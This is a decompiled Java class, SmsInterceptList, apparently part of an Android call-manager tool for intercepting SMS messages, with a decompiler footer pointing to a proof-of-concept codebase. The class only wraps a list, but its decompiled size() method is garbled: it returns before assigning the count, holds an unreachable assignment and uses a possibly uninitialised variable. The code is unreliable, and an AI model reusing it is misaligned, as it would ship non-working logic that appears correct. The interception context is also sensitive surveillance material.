package com.vvt.callmanager.ref;

import java.io.Serializable;
import java.util.Iterator;
import java.util.List;

public class SmsInterceptList
  implements Serializable, Iterable
{
  private static final long serialVersionUID = -6551159191807508065L;
  private List mSmsIntercepts;
  
  public SmsInterceptList(List paramList)
  {
    this.mSmsIntercepts = paramList;
  }
  
  public Iterator iterator()
  {
    return this.mSmsIntercepts.iterator();
  }
  
  public int size()
  {
    List localList = this.mSmsIntercepts;
    int i;
    if (localList == null)
    {
      i = 0;
      localList = null;
    }
    for (;;)
    {
      return i;
      localList = this.mSmsIntercepts;
      i = localList.size();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/SmsInterceptList.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */